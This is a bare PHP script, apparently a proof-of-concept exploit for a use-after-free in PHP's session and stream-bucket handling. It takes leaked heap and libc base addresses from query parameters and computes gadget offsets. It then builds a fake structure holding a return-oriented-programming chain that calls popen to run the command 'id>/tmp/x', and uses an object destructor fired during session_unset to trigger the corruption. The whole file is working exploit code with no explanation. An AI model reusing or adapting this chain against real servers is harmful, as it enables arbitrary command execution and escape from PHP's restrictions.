<?php
error_reporting(0);
$hb = hexdec($_GET['hb'] ?? '0');
$lb = hexdec($_GET['lb'] ?? '0');
if (!$hb || !$lb) { http_response_code(400); exit("need hb/lb\n"); }
$S = $hb + 0x3500;
$leave = $lb + 0x21ef23;
$pop_rdi = $lb + 0x15e492;
$pop_rsi = $lb + 0x15d1a3;
$ret = $lb + 0x15a029;
$popen = $lb + 0x1504d0;
$exitp = $lb + 0x155780;
function pq(&$b, $o, $v) { $b = substr_replace($b, pack('P', $v), $o, 8); }
function pd(&$b, $o, $v) { $b = substr_replace($b, pack('V', $v), $o, 4); }
$b = str_repeat("\x00", 320);
pq($b, 0x60, $S + 0x80); pq($b, 0x68, 0x307);
pd($b, 0x80, 1); pd($b, 0x84, 7); pd($b, 0x88, 16); pd($b, 0x8c, 0xfffffff8);
pq($b, 0x90, $S + 0xa0); pd($b, 0x98, 1); pd($b, 0x9c, 1);
pd($b, 0xa0, 8); pd($b, 0xa4, 0); pq($b, 0xa8, 0);
pq($b, 0xb0, $leave);
pq($b, 0xc0, 0); pq($b, 0xc8, $pop_rdi); pq($b, 0xd0, $S + 0x120);
pq($b, 0xd8, $pop_rsi); pq($b, 0xe0, $S + 0x130);
pq($b, 0xe8, $ret); pq($b, 0xf0, $popen); pq($b, 0xf8, $exitp); pq($b, 0x100, 0);
$b = substr_replace($b, "id>/tmp/x\0", 0x120, 10);
$b = substr_replace($b, "r\0", 0x130, 2);
$payload = $b;
$fp = fopen('php://memory', 'w');
class X {
    public $fp, $payload, $keep = [];
    function __construct($fp, $payload) { $this->fp = $fp; $this->payload = $payload; }
    function __destruct() {
        $_SESSION['pwn'] = 'x';
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
    }
}
session_start();
$_SESSION['x'] = new X($fp, $payload);
for ($i = 0; $i < 7; $i++) { $_SESSION['k'.$i] = 'v'; }
session_unset();
